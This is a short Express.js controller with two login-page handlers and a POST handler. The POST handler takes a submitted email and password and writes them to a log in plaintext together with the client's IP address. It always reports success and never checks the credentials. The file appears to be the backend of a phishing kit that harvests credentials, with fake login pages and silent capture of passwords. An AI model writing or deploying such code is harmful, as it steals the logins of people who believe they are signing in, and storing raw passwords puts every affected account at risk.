const asyncHandler = require("../../helpers/asyncHandler");
const { insertLog } = require("../../helpers/logs");
var get_ip = require('ipware')().get_ip;

//LOGIN GET
exports.loginGet = asyncHandler(async (req, res, next) => {
    
    res.render("general/page/login", {
        title: ""
    })
})

//LOGIN2 GET
exports.login2Get = asyncHandler(async (req, res, next) => {
    
    res.render("general/page/login2", {
        title: "",
        email: req.query.email || ""
    })
})

//LOGIN2 GET LOGS
exports.login2Post = asyncHandler(async (req, res, next) => {
    
    const ip_info = get_ip(req);

    const obj = {
        l_email: req.query.email || req.body.email,
        l_password: req.body.password,
        l_ip: ip_info.clientIp
    }

    await insertLog(obj);
    
    return res.json({status:true})
})